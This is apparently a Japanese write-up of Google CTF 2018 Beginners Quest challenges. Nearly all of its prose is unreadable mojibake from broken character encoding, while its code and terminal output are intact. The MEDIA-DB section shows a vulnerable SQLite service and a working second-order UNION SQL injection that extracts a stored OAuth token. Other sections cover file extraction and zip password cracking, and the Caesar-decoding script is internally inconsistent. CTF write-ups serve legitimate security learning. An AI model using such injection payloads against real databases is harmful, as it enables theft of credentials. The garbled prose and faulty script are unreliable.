googleCTF’¤Î’²ò’Àâ’¤ò’¤·’¤Æ’¤³’¤¦’¤È’»×’¤¤’¤Þ’¤¹’¡£<br>

![GoogleCTF ’¥µ’¥¤’¥È](https://capturetheflag.withgoogle.com/)

’¼ç’¤ËBeginnersQuest’¤ò’¥á’¥¤’¥ó’¤Ë’²ò’Àâ’¤·’¤Æ’¤¤’¤³’¤¦’¤È’»×’¤¤’¤Þ’¤¹’¡£<br>
(Challenges’¤Ï’Àµ’Ä¾’¥ì’¥Ù’¥ë’¤¬’¹â’¤¯1’Ìä’¤·’¤«’²ò’¤±’¤Ê’¤«’¤Ã’¤¿....)<br>
challenges’¤â’¤Ç’¤­’¤¿’Ìä’Âê’¤Î’¤ß’²ò’Àâ’¤·’¤Þ’¤¹’¡£<br>

’½Ð’Âê’Ìä’Âê’¤Ïfile’¥Õ’¥©’¥ë’¥À’¤Ë’Æþ’¤Ã’¤Æ’¤¤’¤Þ’¤¹<br>

#  Google Capture The Flag 2018 #

## MISC ##

feel it

# Google_CTF_Beginners_Quest #

## MISC ##

LETTER<br>
FLOPPY<br>
FLOPPY2<br>
OCR_IS_COOL<br>
SECURITY_BY_OBSECURITY<br>
MEDIA-DB

## RE ##

FIRMWARE<br>
GATEHEEPER

## WEB ##

JS SAFE<br>
ROUTERUI<br>

## PWN ##

MOAR<br>
ADMIN UI<br>
ADMIN UI2<br>
ADMIN UI3<br>



# MISC/feel it #



# MISC/LETTER #

’¤³’¤Î’¥Õ’¥¡’¥¤’¥ë’¤ò’²ò’Åà’¤¹’¤ë’¤È,pdf’¥Õ’¥¡’¥¤’¥ë’¤¬’½Ð’¤Æ’¤­’¤Þ’¤¹’¡£<br>
PDF’¥Õ’¥¡’¥¤’¥ë’¤ò’¸«’¤Æ’¤ß’¤Þ’¤·’¤ç’¤¦’¡£

![](image/latter.png)

’¤³’¤Î’¤è’¤¦’¤Ë,USERNAME’¤ÈPASS’¤¬’¸«’¤¨’¤Ê’¤¯’¤Ê’¤Ã’¤Æ’¤¤’¤Þ’¤¹’¡£<br>
’¤³’¤³’¤Çpdf’¤òtxt’²½’¤·’¤Æ’¤ß’¤Þ’¤¹’¡£<br>
’º£’²ó’¤Ïpdftotxt’¤È’¤¤’¤¦’¥³’¥Þ’¥ó’¥É’¤ò’»È’¤¤pdf’¤òtxt’¤Ë’¤·’¤Þ’¤·’¤¿’¡£

’¼Â’¹Ô’¤·’¤Æ’¤ß’¤ë’¤È

```
Fake Name
Fake Address
Fake City

A couple of days ago

IOT Credentials

Dear Customer,
Thanks for buying our super special awesome product, the Foobarnizer 9000!
Your credentials to the web interface are:
œò¢¯ Username:œôòë...........................
œò¢¯ Password: œôòëCTF{ICanReadDis}
Noteœôòë: For security reasons we cannot change your password. Please store them safely.
```

flag’¤¬’½Ð’¤Æ’¤­’¤Þ’¤·’¤¿’¤Í’¡£
Flag: `CTF{ICanReadDis}`

# MISC/FLOPPY #

’¥Õ’¥¡’¥¤’¥ë’¤ò’²ò’Åà’¤·’¤Þ’¤¹’¡£
’¤½’¤¦’¤¹’¤ë’¤Èfoo.icon’¤È’¤¤’¤¦icon’¥Õ’¥¡’¥¤’¥ë’¤¬’½Ð’¤Æ’¤­’¤Þ’¤·’¤¿<br>
strings’¥³’¥Þ’¥ó’¥É’¤Ç’´Ø’·¸’¤¢’¤ê’¤½’¤¦’¤Ê’Ê¸’»ú’Îó’¤¬’¤¢’¤ê’¤½’¤¦’¤«’Ä´’¤Ù’¤Æ’¤ß’¤Þ’¤¹’¡£

```
net40-dhcp199:gctf yotti$strings foo.icon

DDDA
DDDC333333
OOOO
DDDI
ODOI
DDDI
OODI
1DDDI
1DDOI
1DDGK
1OODI
1DDDI
1DOtI
1DDDI
1ODOI
1DDDI
1DDDK
driver.txtUT
-[ux
i Xq
www.comUT
-[ux
\,-8[
Uka9
%wv%K
)RxO
2Sgm
FKQ"
driver.txtUT
-[ux
www.comUT
-[ux
net40-dhc
```

’º£’²ó’¤Ï’²è’Áü’¤Ç’¤¹’¤¬,’¥¹’¥Æ’¥¬’¥Î’¥°’¥é’¥Õ’¥£’¡¼’¤Ç’¤Ï’¤Ê’¤µ’¤½’¤¦’¤Ç’¤¹’¡£<br>
icon.file’¤Î’Ãæ’¤Ëdriver,txt’¤Ê’¤É’±£’¤µ’¤ì’¤¿’¥Õ’¥¡’¥¤’¥ë’¤¬’¤¢’¤ë’¤Î’¤Ç,binwalk’¤Ê’¤É’¤ò’»È’¤Ã’¤Æ’Ãê’½Ð’¤·’¤Æ’¤ß’¤Þ’¤¹’¡£

```
net40-dhcp199:gctf yotti$ binwalk -e foo.ico 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
765           0x2FD           Zip archive data, at least v2.0 to extract, compressed size: 123, uncompressed size: 136, name: driver.txt
956           0x3BC           Zip archive data, at least v2.0 to extract, compressed size: 214, uncompressed size: 225, name: www.com
1392          0x570           End of Zip archive
```

’Í½’ÁÛ’ÄÌ’¤ê’¥Õ’¥¡’¥¤’¥ë’¤¬’±£’¤µ’¤ì’¤Æ’¤¤’¤Þ’¤·’¤¿’¡£<br>
dirver.txt’¤Ë’¤Ï

```
$cat driver.txt
This is the driver for the Aluminum-Key Hardware password storage device.
     CTF{qeY80sU6Ktko8BJW}
In case of emergency, run www.com
```

’¤È’½ñ’¤«’¤ì’¤Æ’¤¤’¤Þ’¤·’¤¿’¡£’¤³’¤ì’¤Çflag’¥²’¥Ã’¥È’¤Ç’¤¹’¡£



# MISC/FLOPPY2 #

’¼¡’¤Ï’Àè’¤Û’¤É’²ò’ÀÏ’¤·’¤¿FLOPPY’¤Ë’Æþ’¤Ã’¤Æ’¤¤’¤¿
www.com’¤È’¤¤’¤¦’¥Õ’¥¡’¥¤’¥ë’¤ò’²ò’ÀÏ’¤·’¤Þ’¤¹’¡£

```
net40-dhcp199:_foo.ico.extracted yotti$ cat www.com 
hD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!{p*S:eTM'~_?o?VThe Foobanizer9000 is no longer on the OffHub DMZ.          $P[0/,64"P4APG
```

’¤Ê’¤Ë’¤ä’¤é’¤è’¤¯’¤ï’¤«’¤é’¤ó’Ê¸’»ú’Îó’¤¬’¤¿’¤¯’¤µ’¤ó’Æþ’¤Ã’¤Æ’¤Þ’¤¹’¡£<br>
’ºÇ’¸å’¤Î’Ê¸’¾Ï’¤Ë’¡¢The Foobanizer9000 is no longer on the OffHub DMZ.
’¤È’¤¤’¤¦’Ê¸’¾Ï’¤¬’Æþ’¤Ã’¤Æ’¤Þ’¤¹’¡£<br>
file’¥³’¥Þ’¥ó’¥É’¤ò’»È’¤Ã’¤Æ’¤â,’Í­’ÎÏ’¤Ê’¾ð’Êó’¤Ï’¼ê’¤Ë’Æþ’¤ê’¤Þ’¤»’¤ó....<br>
’¤¿’¤À’²¿’¤é’¤«’¤Î’¥×’¥í’¥°’¥é’¥à’¤ä’¼Â’¹Ô’¥Õ’¥£’¥¢’¥ë’¤Ç’¤¢’¤ë’¤³’¤È’¤Ï’³Î’¤«’¤Ç’¤¹’¡£<br>
’¤½’¤³’¤Çwww.com’¤Î.com’¤È’¤¤’¤¦’³È’Ä¥’»Ò’¤¬’²¿’¤Ê’¤Î’¤«’Ä´’¤Ù’¤Æ’¤ß’¤ë’¤È<br>

wiki’¤è’¤ê<br>
`COM Filename extension COM
Type of format Executable Extended to DOS MZ executable
A COM file is a type of simple executable file. On the Digital Equipment operating systems of the 1970s, .COM was used as a filename extension for text files containing commands to be issued to the operating system (similar to a batch file).[1] With the introduction of CP/M (a microcomputer operating system), the type of files commonly associated with COM extension changed to that of executable files. This convention was later carried over to MS-DOS. Even when complemented by the more general .exe file format for executables, the compact COM files remained viable and frequently used in MS-DOS.`

’¤Ä’¤Þ’¤êMS-DOS’¤Ç’»È’¤ï’¤ì’¤Æ’¤¤’¤¿’³È’Ä¥’»Ò’¤Î’¤è’¤¦’¤Ç’¤¹’¡£<br>
’¤½’¤³’¤ÇDOSbox’¤È’¤¤’¤¦’¤â’¤Î’¤ò’¥À’¥¦’¥ó’¥í’¡¼’¥É’¤·’¤Æ’Ãæ’¤Ç’¼Â’¹Ô’¤·’¤Æ’¤ß’¤ë’¤³’¤È’¤Ë’¤·’¤Þ’¤·’¤¿’¡£

![](image/floppy4.pnh)

’¤·’¤«’¤·Dosbox’¤Çwww.com’¤ò’¼Â’¹Ô’¤·’¤Æ’¤â,<br>
The Foobanizer9000 is no longer on the OffHub DMZ.<br>
’¤È’½Ð’¤ë’¤Ð’¤«’¤ê’¤Çflag’¤È’´Ø’·¸’¤¢’¤ê’¤½’¤¦’¤Ê’Ê¸’»ú’Îó’¤Ï’½Ð’¤Æ’¤­’¤Þ’¤»’¤ó’¤Í’¡£’¡£<br>

’Äü’¤á’¤ë’¤Î’¤â’áû’¤Ê’¤Î’¤Ç’¤¤’¤í’¤¤’¤í’Ä´’¤Ù’¤Æ’¤ß’¤ë’¤³’¤È’¤Ë...<br>

’¤¹’¤ë’¤È’¥Ç’¥Ð’¥Ã’¥°’¥â’¡¼’¥É’¤Ê’¤ë’¤â’¤Î’¤¬,DOSBox’¤Ë’¤Ï’¤¢’¤ë’¤³’¤È’¤¬’¤ï’¤«’¤ê’¤Þ’¤·’¤¿’¡£<br>
’¤³’¤ì’¤Ï’¥³’¡¼’¥É’Åù’¤ò’°ì’»þ’Ää’»ß’¤Ê’¤É’¤·’¤Ê’¤¬’¤é’¥×’¥í’¥°’¥é’¥à’¤ò’¼Â’¹Ô’¤¹’¤ë’µ¡’Ç½’¤Î’¤è’¤¦’¤Ç’¤¹’¡£<br>
https://www.vogons.org/viewtopic.php?t=3944<br>
’¤³’¤³’¤«’¤é’¤Þ’¤º’¥½’¡¼’¥¹’¥³’¡¼’¥É’¤ò’¥À’¥¦’¥ó’¥í’¡¼’¥É’¤·,’¼Â’¹Ô’¤·’¤Þ’¤¹’¡£<br>

’¤³’¤³’¤Ç’¥«’¡¼’¥Í’¥ë’¥â’¡¼’¥É’¤Î’Àß’Äê’¤ò’ÊÑ’¹¹’¤·’¤Æ’¤¢’¤²’¤ë’É¬’Í×’¤¬’¤¢’¤ê’¤Þ’¤¹’¡£<br>
debug’¥â’¡¼’¥É’¤Ï’½é’´ü’Àß’Äê’¤Ç’¤Ï’¥·’¥ê’¥¢’¥ë’¥Ý’¡¼’¥È’¤Ë’Ê¸’»ú’Îó’¤ò’Á÷’¤Ã’¤Æ’¤¤’¤ë’¤Î’¤Ç,
dosbox.conf’¤Î’Ãæ’¿È’¤ò’ÊÑ’¹¹’¤¹’¤ë’É¬’Í×’¤¬’¤¢’¤ë’¤Î’¤Ç’¤¹’¡£

`
serial1=modem listenport:5000
serial2=modem listenport:5001
`

’¤½’¤¦’¤¹’¤ë’¤³’¤È’¤Ç,’¥Ç’¥Ð’¥Ã’¥¬’¡¼’¤¬’¶Û’µÞ’Ää’»ß’¤·’¤¿’»þ’¤Ë,’ºÆ’ÅÙ’¼Â’¹Ô’¤µ’¤ì’¤Þ’¤¹’¡£

`CTF{g00do1dDOS-FTW}`

’·ë’¹½’¶ì’Àï’¤·’¤Þ’¤·’¤¿....<br>
’¤Þ’¤À’¤â’¤Ã’¤È’´Ê’Ã±’¤Ê’Êý’Ë¡’¤¬’¤¢’¤ê’¤½’¤¦’¤Ê’¤Î’¤Ç,’¤¤’¤í’¤¤’¤í’Ä´’¤Ù’¤Æ’¤¢’¤ê’¤½’¤¦’¤Ê’¤é’¹¹’¿·’¤·’¤Þ’¤¹’¡£


## MISC/OCR_IS_COOL ##

’¤Þ’¤º’²ò’Åà’¤·’¤Æ’¤ß’¤ë’¤È...

![](image/ocr.png)

’°Ê’¾å’¤Î’¤è’¤¦’¤Ê’¥Õ’¥¡’¥¤’¥ë’¤¬’½Ð’¤Æ’¤­’¤Þ’¤·’¤¿<br>
’Àè’¤Û’¤É’¤Îfloppy’Æ±’ÍÍ’¤Ë’±£’¤·’¥Õ’¥¡’¥¤’¥ë’¤¬’¤Ê’¤¤’¤«’Ä´’¤Ù’¤¿’¤ê,’¥¹’¥Æ’¥¬’¥Î’¥°’¥é’¥Õ’¥£’¡¼’¤Ç’Ä´’¤Ù’¤¿’¤ê’¤·’¤Þ’¤·’¤¿’¤¬,’¤É’¤ì’¤â’°ã’¤¦’¤è’¤¦’¤Ç’¤¹’¡£

’¤³’¤³’¤Ç’¤·’¤Ã’¤«’¤ê’¤È’²è’Áü’¤ò’¸«’¤Æ’¤ß’¤ë’¤È,’¤Ê’¤Ë’¤ä’¤é’Ê¸’»ú’Îó’¤¬’¤ª’¤«’¤·’¤¤’¤³’¤È’¤Ë’µ¤’¤Å’¤­’¤Þ’¤·’¤¿’¡£<br>
’¤³’¤ì’¤Ï’¥·’¡¼’¥¶’¡¼’°Å’¹æ’¤Ç’Ê¸’»ú’Îó’¤ò’¤º’¤é’¤·’¤Æ’¤¤’¤ë’¤Î’¤Ç’¤Ï’¤Ê’¤¤’¤«’¡©<br>
’¤Ã’¤È’µ¤’¤Å’¤­’¤Þ’¤·’¤¿’¡£<br>
’¤½’¤³’¤Ç’Á´’Éô’²è’Áü’¤«’¤é’¼ê’ÂÇ’¤Á’¤·’¤Æ,’Ãê’½Ð’¤¹’¤ë’¤Î’¤Ï’¤È’¤Æ’¤â’¤á’¤ó’¤É’¤¯’¤µ’¤¤’¤Î’¤Ç,’¼«’Æ°’¤Ç’Ê¸’»ú’¤ò’Ç§’¼±’¤·’¤Ætxt’²½’¤·’¤Æ’¤¯’¤ì’¤ë,tesseract’¤È’¤¤’¤¦’¥Ä’¡¼’¥ë’¤ò’»È’¤¤’¤Þ’¤¹’¡£

```
(- e m mall.google.(om œôòø œôòøz œôòø 5
IVI Gmail Q Searchmaœóè¢ - O
<œôòô S o e n n 5 w o n
+ Compose
YouriDropDrive is ready mm 6 Z a
D Inbox
* 3œôòø3œôòýœôòü œôòü ropD elelm<wDropDHvEQ/cxfcompwuoncom) JuvvœôòùAiœôòùAUéQJSAM {7 « 5 0
Q Snuuzed mmœôòü
Wxxkvnlmmxk
> Sent
I mam PxxkxamrmhpxevhfxnMkgxpxœôòømvmmmxkhyhnkœôòøxvnkxDwkmwkhuxvehnwyhexlalkhgzœôòøxkobvxTœôòølyxlewxyhkleemnkyhexœôòø +
V More Lmhkxlgrybex
nwkmwkbox mm m. pbma 15 Iu hyykxxhgehgxhkhyyehgxlmhkux mmmgumpm ungkbxl \lbgmhgzl.yetzl.ybkœóè¡plkx\ uhmvhbgœôòø pkhmxnlvxgrmabgz
o Wmlevmuled +
0.
Lxx mm \mnyyxgvpaxkx
Rhnkyhexlbgbwkmwkboxwguxkxwaxwykhugvyhhmghsxk mkmykhwzxznuo mmmmeummnnv hklxwhuv m paxkxukanzh mnkyhexlyheehp
Lalkx ybexœôòø xgw yhekaœôòø
m mg jnhvder Dgobmx mam mh obxp. whpgemw. lgw vheemhklmx hg xee max ybexœôòø mn plgm um xkhe Immwavxgmœôòø cmm Zbux max! max ebgd vwmmmammnmmmnmnngvmm) xgw max! vlg Wu lee m wum
w xqmex axkxœôòü lemm hy ybexœôòø malm mm WWW \mhkhgz phma m
hyyanujhk'pxkx uhg ChagMK
aHMkawxgmmeœôòø \wy\\[wxexmxw\) Phgmkamxw
vnnmgnsxkenuuœóè¢gmw Pbgmkamxw
mm. Mnkuh
ngvx px mmx mum oxkv \xkbhmev xgw Dg nkka um mm.œôòü mn vzlbgœôòøm onegxkluhebmbxœôòø ehdx ><me Igw nwyexpœôòø px'kx \xgwbgz mm mm vkxwxgmbleœôòø mbgz max mnmnuxg Vbehmlkpzkœôòøwx mu mmm mm
Aw nwmwmngz-
Novece'umaxs « Repœôòøy . Forward

Stan a new one
```


’¤³’¤Î’¤è’¤¦’¤Ê’Ê¸’»ú’Îó’Ãê’½Ð’¤Ç’¤­’¤Þ’¤·’¤¿’¡£<br>
’¤³’¤ì’¤ò’¥·’¡¼’¥¶’¡¼’°Å’¹æ’¤Ç’°ì’Ê¸’»ú’¤º’¤Ä’¤º’¤é’¤·’¤Ê’¤¬’¤é’³Î’Ç§’¤·’¤Æ’¤¤’¤­’¤Þ’¤¹’¡£<br>

’¤¢’¤È’¤Ïtr’¥³’¥Þ’¥ó’¥É’¤äpython’¤Ç’¥³’¡¼’¥É’ºî’¤Ã’¤¿’¤ê’¤·’¤Æ’Ê¸’»ú’¤ò’¤º’¤é’¤·’¤Æ’³Î’Ç§’¤·’¤Æ’¤¤’¤¯’¤À’¤±’¤Ç’¤¹’¡£<br>

’»²’¹Í’¤Þ’¤Ç’¤Ëcaeser’°Å’¹æ’²ò’ÆÉ’¥×’¥í’¥°’¥é’¥à’¤ò’ºÜ’¤»’¤Æ’¤ª’¤­’¤Þ’¤¹<br>
’¥¯’¥½’¤ß’¤¿’¤¤’¤Ê’¥×’¥í’¥°’¥é’¥à’¤Ç’¤¹’¤¬’¤´’Î»’¾µ’¤¯’¤À’¤µ’¤¤<br>


```
#!/usr/bin/python
# -*- Coding: utf-8 -*-



file = open('orc.txt','r')
txt = file.read()
shift = 8
zura = 0



def Caeser(string):
    save = ''
    for s in string:
        s = ord(s)
        if 65 <= s and s<= 90:
            s = s + shift
            if s > 90:
               zura = s - 60
               s = 65 + zura  
        elif 97 <= s and s <= 122:
            s = s + 3
            if s > 122:
               zura  = s - 122
               s = 97 + zura
        s = chr(s)
        save += s
    return save
print Caeser(txt)
```

flag:`CTF{caesarcipherisasubstitutioncipher}`


## MISC/SECURITY_BY_OBSECURITY ##

’²ò’Åà’¤¹’¤ë’¤È

```
$ password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p
```

’¤³’¤Î’¤è’¤¦’¤Ê’¥Õ’¥¡’¥¤’¥ë’¤¬’½Ð’¤Æ’¤­’¤Þ’¤·’¤¿’¡£

file’¥³’¥Þ’¥ó’¥É’¤Ç’Ä´’¤Ù’¤Æ’¤ß’¤ë’¤È<br>
```
$file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n\
.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p
Zip archive data, at least v2.0 to extract
```

zip’¥Õ’¥¡’¥¤’¥ë’¤È’¤¤’¤¦’¤³’¤È’¤¬’¤ï’¤«’¤ê’¤Þ’¤¹’¡£<br>
’¤³’¤ì’¤Ëzip’³È’Ä¥’»Ò’¤ò’ÄÉ’²Ã’¤·’¤Æ’²ò’Åà’¤·’¤Æ’¤ß’¤Þ’¤·’¤¿’¤¬,’¤¦’¤Þ’¤¯’¤¤’¤­’¤Þ’¤»’¤ó’¤Ç’¤·’¤¿’¡£<br>

’¤³’¤ì’¤Ïpassword’ÉÕ’¤­’¤Îzip’¥Õ’¥¡’¥¤’¥ë’¤È’¤¤’¤¦’¤³’¤È’¤¬’È½’ÌÀ’¤·’¤Þ’¤·’¤¿’¡£<br>
’¥Ñ’¥¹’¥ï’¡¼’¥É’¤Î’²ò’ÀÏ’¤Ë’¤ÏJohnTheRipper’¤ò’»È’¤¤’¤Þ’¤¹’¡£<br>

’¤Á’¤Ê’¤ß’¤ËMac’´Ä’¶­’¤Ç’¤Ï,JohnTheRIpper’¤¬’¥¤’¥ó’¥¹’¥È’¡¼’¥ë’¤Ç’¤­’¤Ê’¤«’¤Ã’¤¿’¤Î’¤Ç, Debian’´Ä’¶­’¤Ç’¤ä’¤ê’¤Þ’¤·’¤¿....(’Ã¯’¤«mac’´Ä’¶­’¤Ç’¥¤’¥ó’¥¹’¥È’¡¼’¥ë’¤Ç’¤­’¤ë’¿Í’¤¬’¤¤’¤¿’¤é’¶µ’¤¨’¤Æ’¤¯’¤À’¤µ’¤¤...)<br>



## MISC/MEDIA-DB ##

’Àâ’ÌÀ
```
The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake.

$nc media-db.ctfcompetition.com 1337
```

’¤³’¤Î’Ìä’Âê’¤ÏDB’¥µ’¡¼’¥Ð’¡¼’¤Ë’ÀÜ’Â³’¤·’¤Æ,flag’¤ò’Æþ’¼ê’¤¹’¤ë’¥¿’¥¤’¥×’¤Î’Ìä’Âê’¤Ç’¤¹’¡£<br>

attach’¤µ’¤ì’¤Æ’¤¤’¤¿,’¥½’¡¼’¥¹’¥³’¡¼’¥É’¤ò’¸«’¤Æ’¤ß’¤Þ’¤¹

```
#!/usr/bin/env python2.7

import sqlite3
import random
import sys

BANNER = "=== Media DB ==="
MENU = """\
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit"""

with open('oauth_token') as fd:
  flag = fd.read()

conn = sqlite3.connect(':memory:')
c = conn.cursor()

c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
c.execute("CREATE TABLE media (artist text, song text)")
c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))

def my_print(s):
  sys.stdout.write(s + '\n')
  sys.stdout.flush()

def print_playlist(query):
  my_print("")
  my_print("== new playlist ==")
  for i, res in enumerate(c.execute(query).fetchall()):
    my_print('{}: "{}" by "{}"'.format(i+1, res[1], res[0]))
  my_print("")

my_print(BANNER)

while True:
  my_print(MENU)
  sys.stdout.write("> ")
  sys.stdout.flush()
  choice = raw_input()
  if choice not in ['1', '2', '3', '4', '5']:
    my_print('invalid input')
    continue
  if choice == '1':
    my_print("artist name?")
    artist = raw_input().replace('"', "")
    my_print("song name?")
    song = raw_input().replace('"', "")
    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
  elif choice == '2':
    my_print("artist name?")
    artist = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  elif choice == '3':
    my_print("song name?")
    song = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
  elif choice == '4':
    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
    my_print("choosing songs from random artist: {}".format(artist))
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  else:
    my_print("bye")
    exit(0)

```

’¤È’¤ê’¤¢’¤¨’¤º’¤Þ’¤ºshellscript’¤ò’ºî’À®’¤·’¤Þ’¤¹

```
#! /bin/bash                                                                     
nc media-db.ctfcompetition.com 1337
```

```
net40-dhcp199:script yotti$ ./connect.sh 
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
yotti
song name?
hello 
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 3
song name?
hello

== new playlist ==
1: "hello" by "yotti"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 
```

’¤³’¤ì’¤ò’¸«’¤ë’¤È,’¤Þ’¤ºsong’¤Èplaysong’¤ò’ÄÉ’²Ã’¤¹’¤ë’¤È,DB’¤Ë’¤É’¤ó’¤É’¤ó’ÄÉ’²Ã’¤µ’¤ì’¤Æ’¤¤’¤¯’¤È’¤¤’¤¦’¥×’¥í’¥°’¥é’¥à’¤Î’¤è’¤¦’¤Ç’¤¹’¡£
’¾Ü’¤·’¤¯attach’¤µ’¤ì’¤Æ’¤¤’¤¿’¥×’¥í’¥°’¥é’¥à’¤ò’¸«’¤Æ’¤¤’¤­’¤Þ’¤¹’¡£

’¤³’¤ì’¤é’¤ò’¸«’¤ë’¤Èoauth_token’¡¡text’¤È’¤¤’¤¦’ÀÜ’Â³’¾ì’½ê’¤Ëflag’¤¬’¤¢’¤ë’¤Î’¤Ç’¤Ï’¤Ê’¤¤’¤«’¤È’Í½’Â¬’¤Ç’¤­’¤Þ’¤¹’¡£<br>

’¤â’¤·1’¤È’Æþ’ÎÏ’¤·’¤¿’¤é,’¸å’¤Ë’¤½’¤ì’¤é’¤Èplayaritst’¤¬’·ë’¹ç’¤µ’¤ì’¤ë’¥×’¥í’¥°’¥é’¥à’¤È’¤¤’¤¦’¤³’¤È’¤¬’¤ï’¤«’¤ê’¤Þ’¤¹’¡£<br>

’°ì’¤Ä’¼Â’¸³’¤Ç’¤ä’¤Ã’¤Æ’¤ß’¤Þ’¤·’¤¿

```
> net40-dhcp199:script yotti$ ./connect.sh 
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
yotti
song name?
hello
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: yotti

== new playlist ==
1: "hello" by "yotti"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
yotti
song name?
goodnight
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
yotti' UNION SELECT 1, 2 --
song name?
test
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: yotti' UNION SELECT 1, 2 --

== new playlist ==
1: "2" by "1"
2: "goodnight" by "yotti"
3: "hello" by "yotti"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
```

’¤³’¤ì’¤Ç’·ë’¹ç’¤µ’¤ì’¤Æ’¤¤’¤ë’¤³’¤È’¤¬’¤ï’¤«’¤ê’¤Þ’¤¹<br>
’¤Ç’¤Ï’Àè’¤Û’¤É’¤Îoauth_token’¤òDB’¾å’¤Ç’È´’¤­’¼è’¤ê’¤Þ’¤¹.

```
== new playlist ==
Traceback (most recent call last):
  File "./media-db.py", line 76, in <module>
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
  File "./media-db.py", line 45, in print_playlist
    for i, res in enumerate(c.execute(query).fetchall()):
sqlite3.OperationalError: near "(": syntax error
net40-dhcp199:script yotti$ ./connect.sh 
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 1
artist name?
yotti' UNION SELECT ( SELECT oauth_token FROM oauth_tokens ), 2 --
song name?
hello
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
> 4
choosing songs from random artist: yotti' UNION SELECT ( SELECT oauth_token FROM oauth_tokens ), 2 --

== new playlist ==
1: "2" by "CTF{fridge_cast_oauth_token_cahn4Quo}
"

1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
```

’¤Ï’¤¤oauth_token’¤ò’È´’¤­’½Ð’¤¹’¤³’¤È’¤¬’¤Ç’¤­’¤Þ’¤·’¤¿’¡£


## ##